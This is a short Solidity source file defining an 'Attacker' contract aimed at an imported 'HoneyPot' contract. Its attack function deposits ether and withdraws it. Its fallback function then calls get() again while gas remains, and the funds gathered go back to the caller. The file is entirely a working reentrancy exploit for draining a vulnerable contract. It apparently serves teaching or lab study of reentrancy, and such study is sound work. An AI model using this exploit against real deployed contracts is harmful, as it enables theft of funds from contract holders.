pragma solidity ^0.4.8;

import "./HoneyPot.sol";

contract Attacker {
    function attack(address honeyPot) payable {
        uint before = this.balance;
        HoneyPot(honeyPot).put.value(msg.value)();
        HoneyPot(honeyPot).get();
        if (this.balance <= before) {
            throw;
        }
        if (!msg.sender.send(this.balance)) {
            throw;
        }
    }

    function() payable {
        if (msg.sender.balance >= msg.value && msg.gas >= 20000) {
            HoneyPot(msg.sender).get();
        }
    }
}